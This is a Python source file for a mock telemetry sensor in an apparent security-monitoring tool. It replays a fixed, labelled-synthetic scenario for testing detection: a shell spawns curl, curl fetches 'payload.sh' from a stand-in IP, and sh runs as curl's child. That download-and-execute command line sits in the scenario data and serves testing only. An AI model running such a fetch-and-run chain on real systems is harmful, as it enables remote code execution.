"""Deterministic synthetic telemetry, for tests and for trying the pipeline.

The mock sensor replays a fixed little scenario -- a shell spawned from a
download tool, which then connects out:

    bash
     └── curl            (network connection to 198.51.100.9:443)
          └── sh

Its events are stamped ``source = "mock"`` and ``metadata["synthetic"] = True``
so synthetic telemetry can never be mistaken for something the kernel actually
observed.  Nothing in SentinelForge ever silently falls back to this sensor: if
you ask for eBPF and eBPF is unavailable, you get an error, not fake data.
"""

from __future__ import annotations

import time
from datetime import datetime, timedelta, timezone
from typing import Iterator, Sequence

from ..models.event import EventType, SecurityEvent, Severity, format_timestamp
from .base import Sensor

#: The scenario, as (offset seconds, kind, detail) steps.
DEFAULT_SCENARIO: tuple[dict, ...] = (
    {
        "offset": 0,
        "kind": "process",
        "process": "bash",
        "executable": "/usr/bin/bash",
        "command_line": "bash",
        "pid": 4100,
        "ppid": 1200,
        "parent_process": "sshd",
        "parent_executable": "/usr/sbin/sshd",
    },
    {
        "offset": 2,
        "kind": "process",
        "process": "curl",
        "executable": "/usr/bin/curl",
        "command_line": "curl -s http://198.51.100.9/payload.sh",
        "pid": 4101,
        "ppid": 4100,
        "parent_process": "bash",
        "parent_executable": "/usr/bin/bash",
    },
    {
        "offset": 3,
        "kind": "network",
        "process": "curl",
        "pid": 4101,
        "destination_ip": "198.51.100.9",
        "destination_port": 443,
        "source_ip": "192.168.1.20",
        "source_port": 51234,
        "protocol": "tcp",
        "direction": "outbound",
    },
    {
        "offset": 4,
        "kind": "process",
        "process": "sh",
        "executable": "/usr/bin/sh",
        "command_line": "sh",
        "pid": 4102,
        "ppid": 4101,
        "parent_process": "curl",
        "parent_executable": "/usr/bin/curl",
    },
)


class MockSensor(Sensor):
    """Replays a deterministic telemetry scenario.

    Args:
        scenario: Steps to replay; defaults to :data:`DEFAULT_SCENARIO`.
        start_time: Base timestamp, so tests get stable output.
        user: Username stamped on the events.
        repeat: How many times to replay the scenario (``0`` repeats forever,
            which is what ``sentinelforge sensor start mock --follow`` uses).
        delay: Seconds to sleep between events; ``0`` for tests.
    """

    name = "mock"
    description = "Deterministic synthetic process/network telemetry (development only)"
    source = "mock"

    def __init__(
        self,
        scenario: Sequence[dict] | None = None,
        start_time: datetime | None = None,
        user: str = "capslock",
        host: str | None = None,
        repeat: int = 1,
        delay: float = 0.0,
    ) -> None:
        super().__init__(host=host)
        self.scenario = tuple(scenario or DEFAULT_SCENARIO)
        self.start_time = start_time or datetime(2026, 9, 12, 12, 30, tzinfo=timezone.utc)
        self.user = user
        self.repeat = int(repeat)
        self.delay = float(delay)
        self.emitted = 0

    def events(self) -> Iterator[SecurityEvent]:
        if not self.running:
            self.start()
        cycle = 0
        while self.running and (self.repeat == 0 or cycle < self.repeat):
            for step in self.scenario:
                if not self.running:
                    return
                yield self._event(step, cycle)
                self.emitted += 1
                if self.delay:
                    time.sleep(self.delay)
            cycle += 1

    def _event(self, step: dict, cycle: int) -> SecurityEvent:
        offset = step["offset"] + cycle * (self.scenario[-1]["offset"] + 1)
        timestamp = format_timestamp(self.start_time + timedelta(seconds=offset))

        if step["kind"] == "network":
            metadata = {
                "pid": step.get("pid"),
                "destination_ip": step.get("destination_ip"),
                "destination_port": step.get("destination_port"),
                "source_ip": step.get("source_ip"),
                "source_port": step.get("source_port"),
                "protocol": step.get("protocol", "tcp"),
                "direction": step.get("direction", "outbound"),
                "synthetic": True,
            }
            message = (
                f"{step.get('process')} connected to {step.get('destination_ip')}:"
                f"{step.get('destination_port')} ({metadata['protocol']})"
            )
            return SecurityEvent(
                timestamp=timestamp,
                host=self.host,
                source=self.source,
                event_type=EventType.NETWORK_CONNECTION,
                severity=Severity.INFO,
                user=self.user,
                src_ip=step.get("source_ip"),
                process=step.get("process"),
                message=message,
                raw=message,
                metadata=metadata,
            )

        metadata = {
            "pid": step.get("pid"),
            "ppid": step.get("ppid"),
            "uid": step.get("uid", 1000),
            "executable": step.get("executable"),
            "command_line": step.get("command_line"),
            "parent_process": step.get("parent_process"),
            "parent_executable": step.get("parent_executable"),
            "synthetic": True,
        }
        message = f"Process executed: {step.get('command_line') or step.get('executable')}"
        return SecurityEvent(
            timestamp=timestamp,
            host=self.host,
            source=self.source,
            event_type=EventType.PROCESS_START,
            severity=Severity.INFO,
            user=self.user,
            process=step.get("process"),
            message=message,
            raw=message,
            metadata=metadata,
        )
